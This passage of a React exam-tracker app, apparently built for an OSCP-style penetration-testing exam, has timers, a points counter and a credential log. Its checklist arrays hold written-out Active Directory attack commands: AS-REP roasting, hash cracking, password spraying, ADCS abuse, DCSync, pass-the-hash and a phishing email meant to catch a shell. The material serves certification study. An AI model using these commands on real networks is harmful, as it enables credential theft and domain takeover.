  { id: "ae5", text: "AS-REP Roast for accounts without preauth", cmd: "impacket-GetNPUsers domain.local/user:pass -dc-ip DC_IP -request" },
  { id: "ae6", text: "Crack Kerberoast (13100) or AS-REP (18200) hashes", cmd: "hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt" },
  { id: "ae7", text: "Dump user descriptions — passwords often live here", cmd: "nxc ldap DC_IP -u user -p pass -M get-desc-users" },
  { id: "ae8", text: "Recursive SMB share listing on ALL machines", cmd: "smbmap -H $IP -u user -p pass -d domain -R" },
  { id: "ae9", text: "Check SYSVOL/NETLOGON for GPP cpassword, login scripts, batch files", cmd: "smbclient //DC_IP/SYSVOL -U 'user%pass' -c 'recurse on; prompt off; mget *'" },
  { id: "ae10", text: "Check password policy before spraying", cmd: "nxc smb DC_IP -u user -p pass --pass-pol" },
  { id: "ae11", text: "Enumerate all domain users for spray list", cmd: "nxc smb DC_IP -u user -p pass --users" },
  { id: "ae12", text: "Password spray with found passwords", cmd: "nxc smb DC_IP -u users.txt -p 'Password1' --continue-on-success" },
  { id: "ae13", text: "User=password spray (no brute force)", cmd: "nxc smb DC_IP -u users.txt -p users.txt --no-bruteforce" },
  { id: "ae14", text: "Check for ADCS vulnerable certificate templates", cmd: "certipy find -u user -p pass -dc-ip DC_IP -vulnerable" },
  { id: "ae15", text: "Phishing: SWAKS + webdav share + library file → catch shell", cmd: "swaks -t target@domain --from attacker@domain --server MAIL_IP --body 'Click link' --attach @payload.txt" },
  { id: "ae16", text: "WordPress/web app admin? Force auth via plugin + Responder" },
  { id: "ae17", text: "WordPress/web app admin? Force auth via plugin + Responder/relay" },
  { id: "ae18", text: "nbtscan internal subnet for machine discovery", cmd: "nbtscan 172.16.x.0/24" },
];

const AD_DC = [
  { id: "dc1", text: "Connect via Evil-WinRM with password or hash", cmd: "evil-winrm -i DC_IP -u Administrator -p pass" },
  { id: "dc2", text: "PsExec with DA creds for SYSTEM shell", cmd: "impacket-psexec domain.local/administrator:pass@DC_IP" },
  { id: "dc3", text: "WMIExec / SMBExec if psexec fails", cmd: "impacket-wmiexec domain.local/administrator:pass@DC_IP" },
  { id: "dc4", text: "RDP to DC with DA creds", cmd: "xfreerdp /v:DC_IP /u:administrator /p:pass /cert-ignore" },
  { id: "dc5", text: "DCSync — dump ALL domain hashes", cmd: "impacket-secretsdump domain.local/user:pass@DC_IP" },
  { id: "dc6", text: "ADCS: request vulnerable cert as administrator", cmd: "certipy req -u user -p pass -ca CA_NAME -template TEMPLATE -upn administrator@domain.local -dc-ip DC_IP" },
  { id: "dc7", text: "RBCD: add fake computer, delegate, impersonate admin" },
  { id: "dc8", text: "WriteDACL: grant yourself DCSync rights then dump", cmd: "impacket-dacledit -action write -rights DCSync -principal user -target-dn 'DC=domain,DC=local' domain.local/user:pass" },
  { id: "dc9", text: "GenericAll/GenericWrite: targeted kerberoast or password reset" },
  { id: "dc10", text: "ForceChangePassword on target user", cmd: "net rpc password 'targetuser' 'NewP@ss123!' -U user%pass -S DC_IP" },
  { id: "dc11", text: "Check LAPS for local admin password on DC", cmd: "nxc ldap DC_IP -u user -p pass -M laps" },
  { id: "dc12", text: "SeBackupPrivilege? Backup ntds.dit with diskshadow/wbadmin" },
  { id: "dc13", text: "Pass-the-hash with admin NTLM if no plaintext", cmd: "impacket-psexec -hashes :NTLM_HASH domain.local/administrator@DC_IP" },
];

const AD_STUCK = [
  { id: "as1", text: "Re-run BloodHound with ALL newly owned users/computers" },
  { id: "as2", text: "SPRAY every found password × every found user (both directions)" },
  { id: "as3", text: "GPP/SYSVOL + NETLOGON scripts for hardcoded creds" },
  { id: "as4", text: "Re-check config files/shares with new elevated permissions" },
  { id: "as5", text: "Check PS transcripts/history on EVERY compromised box" },
  { id: "as6", text: "Try user=password pattern on ALL enumerated domain users" },
  { id: "as7", text: "Check C:\\ unusual folders on every box: Tasks, Scripts, Automation" },
  { id: "as8", text: "icacls on every scheduled task script — writable = instant admin" },
  { id: "as9", text: "Check for PSWA: https://$IP/pswa on any IIS box" },
  { id: "as10", text: "Run nxc --lsa on every admin'd box — cleartext in LSA secrets!" },
  { id: "as11", text: "NTLM theft: Responder + trigger via xp_dirtree/SSRF/file upload" },
  { id: "as12", text: "Azure AD Connect? → extract connector creds (Monteverde pattern)" },
  { id: "as13", text: "Try EVERY password × EVERY user including across usernames" },
  { id: "as14", text: "Run any unknown .exe on compromised boxes — may reveal hashes" },
  { id: "as15", text: "Check windows.old dirs for backup SAM+SYSTEM" },
  { id: "as16", text: "Mount SMB shares with new creds — look for PS history, .log files with hashes" },
  { id: "as17", text: "Linux in AD network? Check for SSH keys, borg backups, .history files, sudo doas" },
  { id: "as18", text: "Setup Responder + find URL input/SSRF → capture NTLMv2 hashes" },
  { id: "as19", text: "FTP writable? Check if it writes to web root → upload shell" },
  { id: "as20", text: "Phishing: SWAKS email + webdav share + library file → catch shell" },
];

const COMMON_PORTS = ["21","22","25","53","80","88","110","111","113","135","139","143","161","389","443","445","1433","3128","3306","3389","5432","5900","5985","6379","8080","8443"];

// ─── COMPONENTS ──────────────────────────────────────────

// Exam countdown — persists start time, counts down from 23:45:00
function ExamClock({startedAt,onStart}) {
  const TOTAL = 23*3600+45*60; // 23h45m
  const [now, setNow] = useState(Date.now());
  useEffect(() => { const iv = setInterval(()=>setNow(Date.now()),1000); return ()=>clearInterval(iv); }, []);
  if (!startedAt) return (
    <button onClick={onStart} style={{background:"rgba(255,68,68,0.08)",border:"1px solid rgba(255,68,68,0.2)",color:"#ff6666",borderRadius:3,padding:"2px 10px",cursor:"pointer",fontSize:10,fontFamily:mono,fontWeight:700,letterSpacing:1}}>⏱ START EXAM</button>
  );
  const elapsed = Math.floor((now - startedAt) / 1000);
  const remain = Math.max(0, TOTAL - elapsed);
  const h = Math.floor(remain/3600), m = Math.floor((remain%3600)/60), s = remain%60;
  const urgent = remain < 3600, warn = remain < 7200 && !urgent;
  return (
    <div style={{display:"flex",alignItems:"center",gap:6}}>
      <span style={{fontSize:13,fontWeight:800,fontFamily:mono,color:urgent?"#ff4444":warn?"#ffaa00":"#44ff44",background:urgent?"rgba(255,68,68,0.12)":"rgba(68,255,68,0.06)",padding:"2px 10px",borderRadius:3,animation:urgent?"pulse 1s infinite":"none",letterSpacing:1}}>
        {String(h).padStart(2,"0")}:{String(m).padStart(2,"0")}:{String(s).padStart(2,"0")}
      </span>
      {urgent&&<span style={{fontSize:9,color:"#ff4444",fontWeight:700}}>⚠ &lt;1HR</span>}
    </div>
  );
}

// Per-machine timer — persists elapsed seconds + running state
function MachineTimer({elapsed,running,onToggle}) {
  const [now, setNow] = useState(Date.now());
  useEffect(() => { if(running) { const iv = setInterval(()=>setNow(Date.now()),1000); return ()=>clearInterval(iv); } }, [running]);
  // If running, add time since last toggle to stored elapsed
  const total = running ? elapsed + Math.floor((now - running) / 1000) : elapsed;
  const h = Math.floor(total/3600), m = Math.floor((total%3600)/60), s = total%60;
  const al = m>=30 && h===0 && !running ? false : total>=1800, wa = total>=1200&&total<1800;
  const display = h > 0 ? `${h}:${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}` : `${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;
  return (
    <div style={{display:"flex",alignItems:"center",gap:5}}>
      <span style={{fontSize:12,fontWeight:700,fontFamily:mono,color:al?"#ff4444":wa?"#ffaa00":"#6688aa",background:al?"rgba(255,68,68,0.12)":"rgba(100,130,160,0.08)",padding:"2px 8px",borderRadius:3,animation:running&&al?"pulse 1s infinite":"none",minWidth:52,textAlign:"center"}}>{display}</span>
      <button onClick={onToggle} style={{background:running?"rgba(255,68,68,0.12)":"rgba(68,255,68,0.12)",color:running?"#ff6666":"#66ff66",border:"none",borderRadius:3,padding:"2px 8px",cursor:"pointer",fontSize:10,fontFamily:mono,fontWeight:700}}>{running?"■ STOP":"▶ START"}</button>
      {total>=1800&&<span style={{fontSize:9,color:"#ff4444",fontWeight:700}}>⚠ 30m+ CHECK PIVOT</span>}
    </div>
  );
}

// Points tracker — 40 for AD set, 10 per standalone flag (local.txt + proof.txt each)
function PointsTracker({data,T,theme}) {
  let pts = 0;
  if (data.ad?.completed) pts += 40;
  ["l1","l2","w1","w2"].forEach(k => {
    const d = data[k]||{};
    if (d.flags?.local) pts += 10;
    if (d.flags?.proof) pts += 10;
  });
  const pass = pts >= 70;
  const col = theme==="hacker"?T.green:pass?T.green:T.orange;
  return (
    <div style={{display:"flex",alignItems:"center",gap:5}}>
      <span style={{fontSize:13,fontWeight:800,fontFamily:mono,color:col,background:`${col}1e`,padding:"2px 10px",borderRadius:3}}>
        {pts}/100{pass?" ✓ PASS":""}
      </span>
    </div>
  );
}

// UDP scan reminder
function UdpReminder({ip,udpDone,onDone}) {
  if (udpDone || !ip) return null;
  return (
    <div style={{padding:"4px 10px",background:"rgba(255,170,0,0.06)",borderBottom:"1px solid rgba(255,170,0,0.12)",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
      <div style={{fontSize:10,fontFamily:mono,color:"#ddaa33"}}>
        ⚠ UDP scan: <span style={{color:"#ffaa00",fontWeight:700}}>sudo nmap -Pn -n {ip} -sU --top-ports=100 --open</span> — SNMP on 161 is a common miss!
      </div>
      <button onClick={onDone} style={{background:"rgba(68,255,68,0.08)",border:"1px solid rgba(68,255,68,0.15)",color:"#44ff44",borderRadius:3,padding:"2px 8px",cursor:"pointer",fontSize:9,fontFamily:mono}}>✓ done</button>
    </div>
  );
}

// Nmap paste → auto-detect ports
function NmapPaste({onAddPorts}) {
  const [show,setShow] = useState(false);
  const [text,setText] = useState("");
  const parse = () => {
    // Match lines like "80/tcp" or "445/tcp"
    const matches = text.match(/(\d+)\/tcp/g);
    if (matches) {
      const ports = [...new Set(matches.map(m => m.replace("/tcp","")))];
      onAddPorts(ports);
    }
    setText(""); setShow(false);
  };
  if (!show) return (
    <button onClick={()=>setShow(true)} style={{background:"rgba(68,170,255,0.06)",border:"1px dashed rgba(68,170,255,0.2)",color:"#4488aa",borderRadius:3,padding:"1px 8px",cursor:"pointer",fontFamily:mono,fontSize:9}}>📋 paste nmap</button>
  );
  return (
    <div style={{padding:"4px 10px",background:"rgba(68,170,255,0.04)",borderBottom:"1px solid rgba(68,170,255,0.1)"}}>
      <textarea value={text} onChange={e=>setText(e.target.value)} placeholder="Paste nmap output here... (auto-detects open TCP ports)" style={{width:"100%",minHeight:50,background:"rgba(0,0,0,0.3)",border:"1px solid rgba(68,170,255,0.15)",borderRadius:3,color:"#88bbdd",fontFamily:mono,fontSize:10,padding:5,resize:"vertical",outline:"none",boxSizing:"border-box"}}/>
      <div style={{display:"flex",gap:4,marginTop:3}}>
        <button onClick={parse} style={{background:"rgba(68,170,255,0.1)",border:"1px solid rgba(68,170,255,0.2)",color:"#44aaff",borderRadius:3,padding:"2px 10px",cursor:"pointer",fontSize:9,fontFamily:mono}}>Extract Ports</button>
        <button onClick={()=>{setText("");setShow(false)}} style={{background:"none",border:"none",color:"#556677",cursor:"pointer",fontSize:11}}>✗</button>
      </div>
    </div>
  );
}

function CheckItem({item,state,onToggle,onStar,note,onNote,ip}) {
  const [exp,setExp] = useState(false);
  const [copied,setCopied] = useState(false);
  const checked = state === "checked" || state === "starred";
  const starred = state === "starred";
  const hasCmd = !!item.cmd;
  const copyCmd = () => {
    let t = item.cmd || item.text;
    t = t.replace(/\$IP/g, ip||"$IP");
    navigator.clipboard.writeText(t).then(()=>{setCopied(true);setTimeout(()=>setCopied(false),1200)}).catch(()=>{});
  };
  return (
    <div style={{borderLeft:`3px solid ${starred?"#ffaa00":checked?"#44ff44":"rgba(100,130,160,0.08)"}`,marginBottom:1,background:starred?"rgba(255,170,0,0.04)":checked?"rgba(68,255,68,0.02)":"transparent"}}>
      <div style={{display:"flex",alignItems:"flex-start",gap:6,padding:"4px 8px"}}>
        <div onClick={()=>onToggle(item.id)} style={{width:15,height:15,borderRadius:3,flexShrink:0,cursor:"pointer",border:checked?"2px solid #44ff44":"2px solid #3a4a5a",background:checked?"rgba(68,255,68,0.15)":"transparent",display:"flex",alignItems:"center",justifyContent:"center",marginTop:2}}>
          {checked&&<span style={{color:"#44ff44",fontSize:10,fontWeight:900}}>✓</span>}
        </div>
        <button onClick={()=>onStar(item.id)} title="Star = part of attack path" style={{background:"none",border:"none",cursor:"pointer",fontSize:13,padding:0,lineHeight:1,color:starred?"#ffaa00":"#2a3a4a",marginTop:1}}>
          {starred?"★":"☆"}
        </button>
        <div onClick={()=>onToggle(item.id)} style={{flex:1,cursor:"pointer"}}>
          <div style={{fontSize:11,lineHeight:1.4,fontFamily:mono,color:checked?(starred?"#ccaa44":"#558866"):"#e8edf2",textDecoration:checked&&!starred?"line-through":"none",opacity:checked&&!starred?0.55:1}}>{item.text}</div>
          {hasCmd&&<div style={{fontSize:10.5,lineHeight:1.4,fontFamily:mono,color:checked?(starred?"#99884a":"#4a7755"):"#6b7f94",marginTop:1}}>{item.cmd}</div>}
        </div>
        {hasCmd&&<button onClick={copyCmd} title="Copy command (replaces $IP)" style={{background:copied?"rgba(68,255,68,0.15)":"none",border:"none",color:copied?"#44ff44":"#334455",cursor:"pointer",fontSize:10,padding:"1px 3px",fontFamily:mono,transition:"all 0.2s",flexShrink:0}}>{copied?"✓":"📋"}</button>}
        <button onClick={()=>setExp(!exp)} style={{background:"none",border:"none",color:"#445566",cursor:"pointer",fontSize:9,padding:"1px 3px",fontFamily:mono,flexShrink:0}}>{exp?"▼":note?"📝":"▶"}</button>
      </div>
      {exp&&<div style={{padding:"0 8px 5px 52px"}}>
        <textarea value={note||""} onChange={e=>onNote(item.id,e.target.value)} placeholder="findings / notes..." style={{width:"100%",minHeight:36,background:"rgba(0,0,0,0.3)",border:"1px solid rgba(100,130,160,0.1)",borderRadius:3,color:"#aabbcc",fontFamily:mono,fontSize:11,padding:5,resize:"vertical",outline:"none",boxSizing:"border-box"}} />
      </div>}
    </div>
  );
}

function DiscoveredPages({pages,onAdd,onRemove}) {
  const [input,setInput] = useState("");
  const add = () => { if(input.trim()){onAdd(input.trim());setInput("")} };
  return (
    <div style={{padding:"5px 10px",background:"rgba(68,170,255,0.03)",borderBottom:"1px solid rgba(68,170,255,0.08)"}}>
      <div style={{fontSize:9,fontWeight:700,color:"#4488aa",fontFamily:mono,marginBottom:3}}>🌐 DISCOVERED PAGES</div>
      {(pages||[]).length>0&&<div style={{display:"flex",flexWrap:"wrap",gap:3,marginBottom:4}}>
        {pages.map((pg,i)=>(
          <div key={i} style={{display:"inline-flex",alignItems:"center",gap:3,background:"rgba(68,170,255,0.06)",border:"1px solid rgba(68,170,255,0.15)",borderRadius:3,padding:"1px 6px"}}>
            <span style={{fontSize:9,fontFamily:mono,color:"#66aacc"}}>{pg}</span>
            <button onClick={()=>onRemove(i)} style={{background:"none",border:"none",color:"#ff6666",cursor:"pointer",fontSize:10,padding:0,lineHeight:1}}>×</button>
          </div>
        ))}
      </div>}
      <div style={{display:"flex",gap:3}}>
        <input value={input} onChange={e=>setInput(e.target.value)} onKeyDown={e=>{if(e.key==="Enter")add()}} placeholder="/admin, /login.php, /api/v1/users..." style={{flex:1,background:"rgba(0,0,0,0.3)",border:"1px solid rgba(68,170,255,0.12)",borderRadius:3,color:"#66aacc",fontFamily:mono,fontSize:10,padding:"3px 7px",outline:"none"}}/>
        <button onClick={add} style={{background:"rgba(68,170,255,0.08)",border:"1px solid rgba(68,170,255,0.15)",color:"#4488aa",borderRadius:3,padding:"3px 8px",cursor:"pointer",fontFamily:mono,fontSize:10}}>+</button>
      </div>
    </div>
  );
}

function Phase({title,timeGuide,items,checks,notes,onToggle,onStar,onNote,color,ip,version,onVersion,pages,onAddPage,onRemovePage}) {
  const [collapsed,setCollapsed] = useState(false);
  const done = items.filter(i=>checks[i.id]==="checked"||checks[i.id]==="starred").length;
  const stars = items.filter(i=>checks[i.id]==="starred").length;
  return (
    <div style={{borderBottom:"1px solid rgba(100,130,160,0.06)"}}>
      <div style={{padding:"7px 10px",background:"rgba(0,0,0,0.12)",cursor:"pointer"}} onClick={()=>setCollapsed(!collapsed)}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center"}}>
          <div style={{display:"flex",alignItems:"center",gap:8}}>
            <span style={{fontSize:10,color:"#556677",fontFamily:mono,width:12}}>{collapsed?"▶":"▼"}</span>
            {color&&<div style={{width:3,height:16,background:color,borderRadius:2}}/>}
            <span style={{fontSize:11.5,fontWeight:800,fontFamily:mono,color:done===items.length?"#44ff44":"#44ff44"}}>{done===items.length?"✓ ":""}{title}</span>
            <span style={{fontSize:9,color:"#445566",fontFamily:mono}}>{done}/{items.length}{stars>0?` (★${stars})`:""}</span>
            {timeGuide&&<span style={{fontSize:9,color:"#334455",fontFamily:mono}}>[{timeGuide}]</span>}
          </div>
        </div>
      </div>
      {!collapsed&&<>
        {onVersion!==undefined&&<div style={{display:"flex",alignItems:"center",gap:6,padding:"4px 10px",background:"rgba(0,0,0,0.08)"}} onClick={e=>e.stopPropagation()}>
          <span style={{fontSize:9,color:"#556677",fontFamily:mono}}>VERSION:</span>
          <input value={version||""} onChange={e=>onVersion(e.target.value)} placeholder="e.g. Apache 2.4.49, OpenSSH 8.2p1" style={{flex:1,maxWidth:350,background:"rgba(0,0,0,0.3)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,color:"#88ddaa",fontFamily:mono,fontSize:10,padding:"3px 7px",outline:"none"}}/>
        </div>}
        {onAddPage&&<DiscoveredPages pages={pages} onAdd={onAddPage} onRemove={onRemovePage}/>}
        {items.map(i=><CheckItem key={i.id} item={i} state={checks[i.id]} note={notes[i.id]} onToggle={onToggle} onStar={onStar} onNote={onNote} ip={ip}/>)}
      </>}
    </div>
  );
}

// Build list of known services for the dropdown
const SERVICE_LIST = Object.entries(PORT_DB).filter(([k])=>k!=="other").map(([k,v])=>({port:k,name:v.name}));

function PortSelector({ports,dismissed,onAdd,onDismiss,onRestore,portServiceMap,onSetService}) {
  const [adding,setAdding] = useState(false);
  const [custom,setCustom] = useState("");
  const [customService,setCustomService] = useState("");
  const avail = COMMON_PORTS.filter(p=>!ports.includes(p)&&!(dismissed||[]).includes(p));
  const addCustom = () => {
    if (custom) {
      onAdd(custom, customService||null);
      setCustom("");
      setCustomService("");
      setAdding(false);
    }
  };
  return (
    <div style={{padding:"6px 10px",borderBottom:"1px solid rgba(100,130,160,0.06)",background:"rgba(0,0,0,0.06)"}}>
      <div style={{display:"flex",flexWrap:"wrap",gap:3,alignItems:"center"}}>
        <span style={{fontSize:9,color:"#445566",fontFamily:mono,marginRight:3}}>PORTS:</span>
        {ports.map(p=>{
          const svc = (portServiceMap||{})[p];
          const resolved = svc ? PORT_DB[svc] : PORT_DB[p];
          const displayName = resolved?.name || PORT_DB.other.name;
          return (
            <div key={p} style={{display:"inline-flex",alignItems:"center",gap:3,background:"rgba(68,170,255,0.08)",border:"1px solid rgba(68,170,255,0.2)",borderRadius:3,padding:"1px 5px"}}>
              <span style={{fontSize:10,fontFamily:mono,color:"#44aaff",fontWeight:700}}>{p}</span>
              <span style={{fontSize:8,color:"#446677",fontFamily:mono}}>{displayName}</span>
              {!PORT_DB[p]&&<select value={svc||""} onChange={e=>onSetService(p,e.target.value||null)} style={{background:"rgba(0,0,0,0.4)",border:"1px solid rgba(100,130,160,0.15)",borderRadius:2,color:"#88ddaa",fontFamily:mono,fontSize:8,padding:"0 2px",outline:"none",cursor:"pointer"}}>
                <option value="">assign service</option>
                {SERVICE_LIST.map(s=><option key={s.port} value={s.port}>{s.name} ({s.port})</option>)}
              </select>}
              <button onClick={()=>onDismiss(p)} style={{background:"none",border:"none",color:"#ff6666",cursor:"pointer",fontSize:11,padding:0,lineHeight:1}}>×</button>
            </div>
          );
        })}
        {!adding?<button onClick={()=>setAdding(true)} style={{background:"rgba(68,255,68,0.06)",border:"1px dashed rgba(68,255,68,0.2)",color:"#559955",borderRadius:3,padding:"1px 8px",cursor:"pointer",fontFamily:mono,fontSize:10}}>+ port</button>:(
          <div style={{display:"flex",gap:3,alignItems:"center",flexWrap:"wrap"}}>
            {avail.slice(0,12).map(p=><button key={p} onClick={()=>{onAdd(p);setAdding(false)}} style={{background:"rgba(100,130,160,0.06)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,padding:"1px 6px",cursor:"pointer",fontFamily:mono,fontSize:9,color:"#8899aa"}}>{p}</button>)}
            <input value={custom} onChange={e=>setCustom(e.target.value)} placeholder="#" onKeyDown={e=>{if(e.key==="Enter")addCustom()}} style={{width:50,background:"rgba(0,0,0,0.3)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,color:"#c0d0e0",fontFamily:mono,fontSize:10,padding:"1px 5px",outline:"none"}}/>
            <select value={customService} onChange={e=>setCustomService(e.target.value)} style={{background:"rgba(0,0,0,0.4)",border:"1px solid rgba(100,130,160,0.15)",borderRadius:3,color:"#88ddaa",fontFamily:mono,fontSize:9,padding:"1px 4px",outline:"none"}}>
              <option value="">auto-detect</option>
              {SERVICE_LIST.map(s=><option key={s.port} value={s.port}>{s.name}</option>)}
            </select>
            <button onClick={addCustom} style={{background:"rgba(68,255,68,0.08)",border:"1px solid rgba(68,255,68,0.15)",color:"#44ff44",borderRadius:3,padding:"1px 6px",cursor:"pointer",fontFamily:mono,fontSize:10}}>✓</button>
            <button onClick={()=>{setAdding(false);setCustom("");setCustomService("")}} style={{background:"none",border:"none",color:"#556677",cursor:"pointer",fontSize:11}}>✗</button>
          </div>
        )}
      </div>
    </div>
  );
}

function AttackChain({chain,setChain}) {
  const [input,setInput] = useState("");
  const add = () => { if(input.trim()){setChain([...chain,input.trim()]);setInput("")} };
  const remove = i => setChain(chain.filter((_,idx)=>idx!==i));
  return (
    <div style={{padding:"6px 10px",borderBottom:"1px solid rgba(255,170,0,0.1)",background:"rgba(255,170,0,0.02)"}}>
      <div style={{fontSize:10,fontWeight:700,color:"#ffaa00",fontFamily:mono,marginBottom:4}}>⚡ ATTACK CHAIN</div>
      <div style={{display:"flex",flexWrap:"wrap",gap:2,alignItems:"center",minHeight:22}}>
        {chain.map((step,i)=>(
          <div key={i} style={{display:"inline-flex",alignItems:"center"}}>
            {i>0&&<span style={{color:"#554400",fontSize:11,margin:"0 3px"}}>→</span>}
            <div style={{background:"rgba(255,170,0,0.1)",border:"1px solid rgba(255,170,0,0.2)",borderRadius:3,padding:"2px 7px",display:"flex",alignItems:"center",gap:4}}>
              <span style={{fontSize:10,fontFamily:mono,color:"#ddaa33"}}>{step}</span>
              <button onClick={()=>remove(i)} style={{background:"none",border:"none",color:"#886633",cursor:"pointer",fontSize:10,padding:0,lineHeight:1}}>×</button>
            </div>
          </div>
        ))}
      </div>
      <div style={{display:"flex",gap:3,marginTop:4}}>
        <input value={input} onChange={e=>setInput(e.target.value)} onKeyDown={e=>{if(e.key==="Enter")add()}} placeholder="add step (e.g., anonymous FTP, file upload, webshell...)" style={{flex:1,background:"rgba(0,0,0,0.3)",border:"1px solid rgba(255,170,0,0.12)",borderRadius:3,color:"#ddaa33",fontFamily:mono,fontSize:10,padding:"3px 7px",outline:"none"}}/>
        <button onClick={add} style={{background:"rgba(255,170,0,0.1)",border:"1px solid rgba(255,170,0,0.2)",color:"#ddaa33",borderRadius:3,padding:"3px 10px",cursor:"pointer",fontFamily:mono,fontSize:10}}>+</button>
      </div>
    </div>
  );
}

// ─── PROGRESS REPORT ─────────────────────────────────────
function ProgressReport({ip,hostname,ports,portVersions,portServiceMap,discoveredPages,chain,checks,notes,flags,osType,creds,mk,extraPhases}) {
  const [show,setShow] = useState(false);
  const [copied,setCopied] = useState(false);

  const buildReport = () => {
    const pv = portVersions||{};
    const psm = portServiceMap||{};
    const relevantCreds = (creds||[]).filter(c=>c.u&&c.p);
    const lines = [
      `═══ PROGRESS REPORT ═══`,
      `IP: ${ip||"N/A"}  Hostname: ${hostname||"N/A"}  OS: ${osType}`,
      ``,
      `── ATTACK CHAIN ──`,
      chain.length?chain.join(" → "):"(not started)",
      ``,
    ];

    // Per-port breakdown
    ports.forEach(p => {
      const pd = PORT_DB[psm[p]] || PORT_DB[p] || PORT_DB.other;
      const portItems = pd.items.map(i=>({...i,fullId:`${mk}-${p}-${i.id}`}));
      const starred = portItems.filter(i=>checks[i.fullId]==="starred");
      const tried = portItems.filter(i=>checks[i.fullId]==="checked");
      const untried = portItems.filter(i=>!checks[i.fullId]);

      lines.push(`══ PORT ${p} — ${pd.name}${pv[p]?" ["+pv[p]+"]":""} ══`);
      const dp = (discoveredPages||{})[p];
      if (dp && dp.length) {
        lines.push(`  [PAGES FOUND]`);
        dp.forEach(pg=>lines.push(`    ${pg}`));
      }
      lines.push(``);
      if (starred.length) {
        lines.push(`  [WORKED]`);
        starred.forEach(i=>lines.push(`    ★ ${i.text}${notes[i.fullId]?" — "+notes[i.fullId]:""}`));
        lines.push(``);
      }
      if (tried.length) {
        lines.push(`  [DIDN'T WORK]`);
        tried.forEach(i=>lines.push(`    - ${i.text}${notes[i.fullId]?" — "+notes[i.fullId]:""}`));
        lines.push(``);
      }
      if (untried.length) {
        lines.push(`  [NOT TRIED YET]`);
        untried.forEach(i=>lines.push(`    · ${i.text}`));
        lines.push(``);
      }
    });

    // Extra phases (AD-specific: connect, privesc, loot, etc.) or standalone privesc
    const phases = extraPhases || [
      {label:"PRIVILEGE ESCALATION",items:(osType==="linux"?PRIVESC_LINUX:PRIVESC_WINDOWS),prefix:`${mk}-`}
    ];
    phases.forEach(phase => {
      const phaseItems = phase.items.map(i=>({...i,fullId:`${phase.prefix}${i.id}`}));
      const pStarred = phaseItems.filter(i=>checks[i.fullId]==="starred");
      const pTried = phaseItems.filter(i=>checks[i.fullId]==="checked");
      const pUntried = phaseItems.filter(i=>!checks[i.fullId]);
      if (pStarred.length||pTried.length) {
        lines.push(`══ ${phase.label} ══`);
        lines.push(``);
        if (pStarred.length) {
          lines.push(`  [WORKED]`);
          pStarred.forEach(i=>lines.push(`    ★ ${i.text}${notes[i.fullId]?" — "+notes[i.fullId]:""}`));
          lines.push(``);
        }
        if (pTried.length) {
          lines.push(`  [DIDN'T WORK]`);
          pTried.forEach(i=>lines.push(`    - ${i.text}${notes[i.fullId]?" — "+notes[i.fullId]:""}`));
          lines.push(``);
        }
        if (pUntried.length) {
          lines.push(`  [NOT TRIED YET]`);
          pUntried.forEach(i=>lines.push(`    · ${i.text}`));
          lines.push(``);
        }
      }
    });

    lines.push(
      `── FLAGS ──`,
      `  local.txt: ${flags?.local||"(not captured)"}`,
      `  proof.txt: ${flags?.proof||"(not captured)"}`,
      ``,
      `── CREDENTIALS ──`
    );
    if (relevantCreds.length) {
      relevantCreds.forEach(c=>lines.push(`  ${c.u}:${c.p} (from: ${c.src||"?"}) [tested: ${c.tested||"?"}]`));
    } else {
      lines.push(`  (none logged)`);
    }
    return lines.join("\n");
  };

  const copy = () => {
    navigator.clipboard.writeText(buildReport()).catch(()=>{});
    setCopied(true); setTimeout(()=>setCopied(false),2000);
  };

  return (
    <div style={{padding:"4px 10px",borderBottom:"1px solid rgba(100,130,160,0.06)"}}>
      <div style={{display:"flex",gap:4}}>
        <button onClick={copy} style={{background:"rgba(68,170,255,0.08)",border:"1px solid rgba(68,170,255,0.2)",color:"#4499cc",borderRadius:3,padding:"3px 10px",cursor:"pointer",fontFamily:mono,fontSize:10,fontWeight:700}}>
          {copied?"✓ Copied!":"📊 Progress Report"}
        </button>
        <button onClick={()=>setShow(!show)} style={{background:"rgba(100,130,160,0.06)",border:"1px solid rgba(100,130,160,0.1)",color:"#556677",borderRadius:3,padding:"3px 8px",cursor:"pointer",fontFamily:mono,fontSize:10}}>
          {show?"▲ hide":"▼ preview"}
        </button>
      </div>
      {show&&<pre style={{marginTop:6,padding:10,background:"rgba(0,0,0,0.3)",border:"1px solid rgba(100,130,160,0.1)",borderRadius:4,color:"#aabbcc",fontFamily:mono,fontSize:9,whiteSpace:"pre-wrap",wordBreak:"break-word",maxHeight:400,overflow:"auto"}}>{buildReport()}</pre>}
    </div>
  );
}

function CredMatrix({creds,setCreds}) {
  const add = () => setCreds([...creds,{id:"c"+Date.now(),u:"",p:"",src:"",tested:""}]);
  const upd = (id,f,v) => setCreds(creds.map(c=>c.id===id?{...c,[f]:v}:c));
  const del = id => setCreds(creds.filter(c=>c.id!==id));
  const inp = {background:"rgba(0,0,0,0.3)",border:"1px solid rgba(100,130,160,0.1)",borderRadius:3,color:"#c0d0e0",fontFamily:mono,fontSize:10,padding:"3px 5px",outline:"none",width:"100%",boxSizing:"border-box"};
  return (
    <div style={{padding:"8px 10px"}}>
      <div style={{display:"flex",justifyContent:"space-between",marginBottom:6}}>
        <span style={{fontSize:12,fontWeight:700,color:"#ffaa00",fontFamily:mono}}>🔑 CREDENTIALS</span>
        <span style={{fontSize:8,color:"#556677",fontFamily:mono}}>EVERY CRED → EVERY SERVICE → 5 MIN</span>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr 1fr 24px",gap:2,marginBottom:2}}>
        {["USER","PASS/HASH","SOURCE","TESTED"].map(h=><div key={h} style={{fontSize:7,fontWeight:700,color:"#445566",padding:"1px 5px",fontFamily:mono,letterSpacing:1}}>{h}</div>)}<div/>
      </div>
      {creds.map(c=><div key={c.id} style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr 1fr 24px",gap:2,marginBottom:2}}>
        <input style={inp} value={c.u} onChange={e=>upd(c.id,"u",e.target.value)} placeholder="user"/>
        <input style={inp} value={c.p} onChange={e=>upd(c.id,"p",e.target.value)} placeholder="pass"/>
        <input style={inp} value={c.src} onChange={e=>upd(c.id,"src",e.target.value)} placeholder="where"/>
